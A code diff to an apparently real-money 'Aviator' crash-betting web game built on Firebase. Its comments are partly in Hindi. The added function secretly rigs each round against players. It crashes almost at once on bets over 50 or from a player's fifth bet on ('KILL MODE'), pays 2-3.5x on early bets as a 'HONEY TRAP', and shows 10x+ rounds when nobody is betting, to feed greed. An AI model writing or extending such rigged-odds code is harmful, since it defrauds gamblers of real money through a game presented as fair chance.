@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aviator Pro: Full Sync</title>
+    <title>Aviator Pro: Chaska Logic Edition</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
+        /* CSS Same as before */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; -webkit-tap-highlight-color: transparent; }
         body { background: #000; height: 100vh; overflow: hidden; color: #fff; display: flex; flex-direction: column; }
         .header { display: flex; justify-content: space-between; padding: 10px 15px; background: #1b1c1d; align-items: center; border-bottom: 1px solid #333; }
@@ -94,15 +95,46 @@
         return { period: dateStr + String(Math.floor(totalSec/20)).padStart(4,'0'), ms: (totalSec % 20) * 1000 + now.getMilliseconds() };
     }
 
+    // --- SMART CHASKA LOGIC ---
+    async function calculateSmartCrash() {
+        const betSnap = await db.ref('gameSettings/aviator/liveBets').once('value');
+        let totalAmt = 0;
+        let highBetFound = false;
+
+        // User ki bet count check karna
+        const userStats = await db.ref('users/' + userId + '/stats').once('value');
+        let betCount = (userStats.val() && userStats.val().totalBets) || 0;
+
+        if (betSnap.exists()) {
+            betSnap.forEach(snap => {
+                let amt = parseFloat(snap.val().amt);
+                totalAmt += amt;
+                if (amt > 50) highBetFound = true; // Rule: 50 se upar ki bet = Instant Crash
+            });
+        }
+
+        if (highBetFound || betCount >= 4) {
+            // KILL MODE: 1.01x - 1.10x (5th bet or big bet)
+            return (Math.random() * 0.09 + 1.01).toFixed(2);
+        } else if (totalAmt > 0 && totalAmt <= 50 && betCount < 4) {
+            // HONEY TRAP: 2x - 3x (First 3 bets)
+            return (Math.random() * 1.5 + 2.0).toFixed(2);
+        } else if (totalAmt === 0) {
+            // LALACH: No bets = 10x+
+            return (Math.random() * 5 + 10).toFixed(2);
+        }
+        return 1.15;
+    }
+
     async function updateTarget() {
         const adminSnap = await db.ref('gameSettings/aviator').once('value');
         const admin = adminSnap.val();
-        const betSnap = await db.ref('gameSettings/aviator/liveBets').once('value');
-        let total = 0; if(betSnap.exists()) betSnap.forEach(b => total += b.val().amt);
-
-        if (admin && admin.forceActive) targetCrash = parseFloat(admin.manualCrash);
-        else if (total >= 50) targetCrash = (Math.random() * 0.10 + 1.01);
-        else targetCrash = (Math.random() * 3 + 1.5);
+        
+        if (admin && admin.forceActive) {
+            targetCrash = parseFloat(admin.manualCrash);
+        } else {
+            targetCrash = await calculateSmartCrash();
+        }
     }
 
     function loop() {
@@ -124,7 +156,11 @@
                 gameStatus = "running";
                 document.getElementById('mult-text').innerText = multiplier.toFixed(2) + "x";
                 [1,2].forEach(id => { 
-                    if(bets[id].waiting) { bets[id].active = true; bets[id].waiting = false; document.getElementById('btn'+id).className = "main-btn cashout"; document.getElementById('txt'+id).innerText = "CASH OUT"; }
+                    if(bets[id].waiting) { 
+                        bets[id].active = true; bets[id].waiting = false; 
+                        document.getElementById('btn'+id).className = "main-btn cashout"; 
+                        document.getElementById('txt'+id).innerText = "CASH OUT"; 
+                    }
                     if(bets[id].active) document.getElementById('s'+id).innerText = (bets[id].amt * multiplier).toFixed(2) + " Rs";
                 });
                 updatePlanePos(time * 30);
@@ -137,7 +173,7 @@
         if(gameStatus === "flew") return;
         gameStatus = "flew"; document.getElementById('mult-text').innerText = "FLEW AWAY!";
         [1,2].forEach(id => { if(bets[id].active) resetBtn(id); });
-        db.ref('gameSettings/aviator/history').push(multiplier.toFixed(2));
+        db.ref('gameSettings/aviator/history').push(parseFloat(multiplier).toFixed(2));
     }
 
     function updatePlanePos(f) {
@@ -159,6 +195,9 @@
     window.handleBet = (id) => {
         let val = parseFloat(document.getElementById('v'+id).value);
         if(gameStatus === "waiting" && !bets[id].waiting && wallet >= val) {
+            // Player ki bet history update karna
+            db.ref('users/' + userId + '/stats/totalBets').transaction(c => (c || 0) + 1);
+            
             db.ref('users/'+userId).transaction(u => { if(u) u.balance -= val; return u; });
             db.ref('gameSettings/aviator/liveBets/' + userId + '_' + id).set({ amt: val });
             bets[id].amt = val; bets[id].waiting = true;
